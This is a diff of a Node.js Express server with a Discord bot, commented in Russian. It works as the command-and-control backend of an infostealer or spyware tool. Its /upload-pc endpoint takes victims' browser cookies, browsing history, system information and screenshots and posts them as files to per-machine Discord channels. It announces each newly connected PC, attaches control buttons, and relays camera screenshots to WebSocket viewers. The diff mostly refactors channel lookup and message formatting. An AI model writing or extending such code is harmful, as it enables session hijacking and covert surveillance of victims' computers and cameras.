@@ -25,11 +25,11 @@ app.use(express.static(path.join(__dirname, "public"))); // для cams.html
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 
-const CATEGORY_BASE_PC = " | Все ПК | ";
-const CATEGORY_BASE_CAM = " | Камеры |";
-const CATEGORY_ARCHIVE_CAM = " | Архив камер | ";
-const LOG_CATEGORY = " | Логи | ";
-const LOG_CHANNEL = " | server-logs | ";
+const CATEGORY_BASE_PC = "Все ПК";
+const CATEGORY_BASE_CAM = "Камеры";
+const CATEGORY_ARCHIVE_CAM = "Архив камер";
+const LOG_CATEGORY = "Логи";
+const LOG_CHANNEL = "server-logs";
 
 const ONLINE_TIMEOUT = 3 * 60 * 1000;
 const MAX_FILE_SIZE = 6 * 1024 * 1024;
@@ -58,7 +58,6 @@ bot.login(DISCORD_BOT_TOKEN);
 function shortHash(s, len = 8) { 
     return crypto.createHash('sha1').update(s).digest('hex').slice(0, len); 
 }
-
 function safeChannelName(prefix, id) { 
     return `${prefix}-${shortHash(id, 8)}`
         .toLowerCase()
@@ -80,15 +79,9 @@ async function getOrCreateCategory(guild, name) {
     const cache = categoryCacheByGuild.get(gid);
     if (cache[name]) return cache[name];
 
-    await guild.channels.fetch(); // обновляем cache
-    const existingCategory = guild.channels.cache.find(
-        c => c.type === ChannelType.GuildCategory && c.name === name
-    );
-
-    if (existingCategory) {
-        cache[name] = existingCategory;
-        return existingCategory;
-    }
+    const channels = await guild.channels.fetch();
+    const matches = channels.filter(c => c.type === ChannelType.GuildCategory && c.name === name);
+    if (matches.size >= 1) { cache[name] = matches.first(); return matches.first(); }
 
     const created = await guild.channels.create({ name, type: ChannelType.GuildCategory });
     cache[name] = created;
@@ -102,15 +95,9 @@ async function getOrCreateTextChannel(guild, name, parentId) {
     const key = `${name}::${parentId}`;
     if (cache[key]) return cache[key];
 
-    await guild.channels.fetch(); // обновляем cache
-    const existingChannel = guild.channels.cache.find(
-        c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
-    );
-
-    if (existingChannel) {
-        cache[key] = existingChannel;
-        return existingChannel;
-    }
+    const channels = await guild.channels.fetch();
+    const matches = channels.filter(c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId);
+    if (matches.size >= 1) { cache[key] = matches.first(); return matches.first(); }
 
     const created = await guild.channels.create({ name, type: ChannelType.GuildText, parent: parentId });
     cache[key] = created;
@@ -123,14 +110,9 @@ async function getOrCreateLogChannel(guild) {
     const category = logCategoryCache || await getOrCreateCategory(guild, LOG_CATEGORY);
     logCategoryCache = category;
 
-    await guild.channels.fetch();
-    const existingLog = guild.channels.cache.find(
-        c => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL && c.parentId === category.id
-    );
-    if (existingLog) {
-        logChannelCache = existingLog;
-        return existingLog;
-    }
+    const channels = await guild.channels.fetch();
+    const matches = channels.filter(c => c.type === ChannelType.GuildText && c.name === LOG_CHANNEL && c.parentId === category.id);
+    if (matches.size > 0) { logChannelCache = matches.first(); return matches.first(); }
 
     const created = await guild.channels.create({ name: LOG_CHANNEL, type: ChannelType.GuildText, parent: category.id });
     logChannelCache = created;
@@ -185,36 +167,53 @@ app.post("/upload-pc", async (req, res) => {
             isNewPc = true;
         }
 
+        // ---------- Оповещение о новом ПК ----------
         if (isNewPc) {
             const logChannel = await getOrCreateLogChannel(guild);
             await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
         }
 
+        // ---------- Формируем файлы и подписи ----------
         const files = [];
         const descriptions = [];
 
         if (cookies) {
-            files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` });
+            files.push({
+                attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)),
+                name: `${channelName}-cookies.json`
+            });
             descriptions.push("🍪 **Cookies** — сохранены");
         }
 
         if (history) {
-            files.push({ attachment: Buffer.from(JSON.stringify({ history }, null, 2)), name: `${channelName}-history.json` });
+            files.push({
+                attachment: Buffer.from(JSON.stringify({ history }, null, 2)),
+                name: `${channelName}-history.json`
+            });
             descriptions.push("📜 **История браузера** — сохранена");
         }
 
         if (systemInfo) {
-            files.push({ attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)), name: `${channelName}-system.json` });
+            files.push({
+                attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)),
+                name: `${channelName}-system.json`
+            });
             descriptions.push("💻 **Системная информация** — сохранена");
         }
 
         if (screenshot) {
-            files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
+            files.push({
+                attachment: Buffer.from(screenshot, "base64"),
+                name: `${channelName}-screenshot.jpeg`
+            });
             descriptions.push("🖼️ **Скриншот** — сохранён");
         }
 
         let contentMsg = `🟢 ПК **${pcId}** обновлён\n\n` + descriptions.join("\n");
-        const messageOptions = { content: contentMsg, components: createControlButtons(pcId) };
+        const messageOptions = {
+            content: contentMsg,
+            components: createControlButtons(pcId)
+        };
         if (files.length) messageOptions.files = files;
 
         await finalChannel.send(messageOptions);
@@ -242,6 +241,7 @@ app.post("/upload-cam", async (req, res) => {
         const { camId, screenshot } = req.body;
         if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });
 
+        // Broadcast to WS clients
         if (wsCameraClients[camId]) {
             wsCameraClients[camId].forEach(ws => { 
                 try { ws.send(JSON.stringify({ camId, screenshot })); } 
@@ -249,7 +249,6 @@ app.post("/upload-cam", async (req, res) => {
             });
         }
 
-        const isNewCam = !channelByCam[camId];
         camLastUpload[camId] = Date.now();
 
         const guild = await bot.guilds.fetch(GUILD_ID);
@@ -265,11 +264,6 @@ app.post("/upload-cam", async (req, res) => {
         if (!finalChannel || finalChannel.parentId !== category.id) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByCam[camId] = finalChannel.id;
-        }
-
-        if (isNewCam && !isInactive) {
-            const logChannel = await getOrCreateLogChannel(guild);
-            await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
         }
 
         const buffer = Buffer.from(screenshot, "base64");
